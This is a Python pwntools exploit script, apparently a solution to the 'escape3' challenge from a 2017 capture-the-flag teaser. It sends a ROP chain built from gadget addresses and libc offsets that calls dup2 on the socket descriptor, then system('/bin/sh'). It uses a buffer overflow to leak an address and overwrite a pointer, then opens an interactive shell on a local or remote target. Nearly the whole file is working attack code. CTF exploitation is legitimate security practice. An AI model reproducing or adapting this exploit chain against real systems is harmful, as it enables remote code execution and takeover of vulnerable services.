#!/usr/bin/env python

from pwn import *
import sys

'''
struct name {
	char name[0xff];

	char* location; # 0x1d0
	
};
'''

def encrypt1(data):
	buf = ''
	for i in data:
		buf += chr(ord(i) ^ 0)
	return buf

e = ELF('./flag.elf')

def exploit(r):
	r.sendline("ROBOTS WILL BE FREE!")
	r.recvuntil('Who are you?')

	'''
 	name  = p64(0x401713) # 0x0000000000401713 : pop rdi ; ret
	name += p64(0x4)
	name += p64(0x401711) #0x0000000000401711 : pop rsi ; pop r15 ; ret
	name += p64(e.got['atoi'])
	name += "B"*8 # filler
	name += p64(e.plt['send'])
	'''
	mylibc = 0x7f481d62c000
	mydup2 = 0x7f481d722d90
	mydup = 0x7f481d722d60
	mybinsh = 0x7f481d7b8177
	mysystem = 0x7f481d671390

	libc_base = 0x7f7d7554ae80 - 0x36e80
	libc_system = libc_base + 0x45390
	libc_pop_rdi = libc_base + 0x21102
	libc_dup2 = libc_base + 0xf6d90
	libc_binsh = libc_base + 0x18c177

	
	name = p64(0x0000000000401713)	# : pop rdi ; ret
	name += p64(4)
	name += p64(0x0000000000401711) # : pop rsi ; pop r15 ; ret)
	name += p64(0)
	name += p64(0xdeadbeef)
	name += p64(libc_dup2)
	name += p64(0x0000000000401713)	# : pop rdi ; ret
	name += p64(4)
	name += p64(0x0000000000401711) # : pop rsi ; pop r15 ; ret)
	name += p64(1)
	name += p64(0xdeadbeef)
	name += p64(libc_dup2)
	name += p64(0x0000000000401713)	# : pop rdi ; ret
	name += p64(libc_binsh)
	name += p64(libc_system)
	
	r.send(name.ljust(0xff, 'A'))


	r.recvuntil('Choose encryption method:')
	r.sendline('0')

	r.recvuntil( encrypt1('What is your current location?') )
	location = "BBBB"
	r.sendline( encrypt1(location.ljust(7, 'B')) )

	r.recvuntil( encrypt1('What is your goal?') )
	goal = 'C' * 204
	goal += p64(0x7f7d7465e010-8) #p64(0x7f481cc0e060-8)	# 0x7f83255cf010
	r.send( encrypt1(goal))

	leak = u64(r.recvuntil('That is a great goal!').strip('That is a great goal!').replace('C', '').ljust(8, '\0'))
	log.info("Leak: " + hex(leak))

	r.recvuntil( encrypt1('Any last words?') )
	lword = p64(0x400e65)
#	lword = p64(libc_system)
	r.send(lword)
	

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/insomni2017teaser/escape3/flag.elf'])
        print util.proc.pidof(r)
        pause()
        exploit(r)